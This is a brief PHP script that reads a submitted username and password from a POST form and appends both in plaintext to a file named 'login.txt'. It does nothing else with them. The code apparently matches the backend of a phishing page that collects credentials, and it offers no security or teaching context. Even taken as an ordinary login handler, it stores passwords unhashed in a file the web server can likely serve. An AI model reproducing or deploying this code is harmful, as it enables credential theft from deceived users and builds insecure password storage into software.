<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the username and password from the form
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Define the file path where you want to store the data
    $filePath = "login.txt";

    // Open the file in append mode
    $file = fopen($filePath, "a");

    if ($file) {
        // Write the username and password to the file
        fwrite($file, "Username: " . $username . "\n");
        fwrite($file, "Password: " . $password . "\n");
        fwrite($file, "\n"); // Add a newline to separate entries
        fclose($file);
        echo "Data has been saved.";
    } else {
        echo "Unable to open the file for writing.";
    }
} else {
    echo "Invalid request.";
}
?>
